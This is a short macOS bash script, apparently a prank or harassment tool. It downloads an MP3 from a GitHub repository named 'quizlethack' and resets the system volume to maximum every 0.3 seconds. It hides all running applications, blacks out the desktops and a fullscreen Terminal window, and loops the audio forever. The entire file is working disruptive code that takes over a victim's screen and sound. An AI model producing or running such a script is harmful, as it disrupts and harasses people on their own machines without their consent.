#!/bin/bash

# Download MP3
curl -L -o /tmp/von.mp3 "https://github.com/hoursinblack/quizlethack/raw/main/King%20Von%20-%20Armed%20%26%20Dangerous%20(Audio).mp3"

# Start looping volume to 100%
while true; do
  osascript -e 'set volume output volume 100'
  sleep 0.3
done &
VOLUME_PID=$!

# Create fullscreen black AppleScript overlay
osascript <<EOF
tell application "Finder" to set visible of every process to false
tell application "System Events"
    set theDesktops to a reference to every desktop
    repeat with aDesktop in theDesktops
        set picture of aDesktop to "/System/Library/Desktop Pictures/Solid Colors/Solid Black.png"
    end repeat
end tell
EOF

# Open black Terminal fullscreen to simulate blackout
osascript <<EOF
tell application "Terminal"
    activate
    delay 0.3
    set bounds of front window to {0, 0, 3000, 2000}
    do script "clear; printf '\\033[40m'; while :; do sleep 1; done"
end tell
EOF

# Loop audio forever
while true; do
  afplay /tmp/von.mp3
done &
AUDIO_PID=$!

# Wait forever
wait
